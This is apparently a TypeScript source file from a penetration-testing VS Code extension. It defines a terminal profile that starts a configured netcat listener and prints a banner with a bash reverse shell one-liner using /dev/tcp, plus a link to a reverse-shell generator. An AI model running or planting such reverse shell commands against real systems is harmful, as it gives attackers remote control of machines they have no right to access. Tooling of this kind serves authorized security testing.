import * as vscode from 'vscode';
import { logger } from '../../global/log';

export class NetcatWeaponizedTerminalProvider implements vscode.TerminalProfileProvider {
  provideTerminalProfile(token: vscode.CancellationToken): vscode.ProviderResult<vscode.TerminalProfile> {
    let netcatCommand = vscode.workspace.getConfiguration("weaponized").get<string>("netcat");
    if (!netcatCommand) {
      vscode.window.showErrorMessage("Please set the 'weaponized.netcat' configuration in settings.");
      return undefined;
    }
    let lport = vscode.workspace.getConfiguration("weaponized").get<string>("lport", "$LPORT");
    let args: string[] = [
      "-c",
      netcatCommand.replace("${LPORT}", lport)
    ];

    let lhost = vscode.workspace.getConfiguration("weaponized").get<string>("lhost", "$LHOST");

    let msg = `\r\nIP ADDRESS: ${lhost}\tPORT: ${lport}\r\nBasic Reverse Shell Command:\r\n\t/bin/bash -i >& /dev/tcp/${lhost}/${lport} 0>&1\r\nAdvanced Reverse Shell Command:\r\n\thttps://rev.eson.ninja/?ip=${lhost}&port=${lport}\r\n`;
    logger.debug(`Starting Meterpreter session with args: ${JSON.stringify(args)}`);
    return {
      options: {
        "name": "netcat",
        "shellPath": "zsh",
        "shellArgs": args,
        "hideFromUser": false,
        message: msg,
      }
    };
  }
}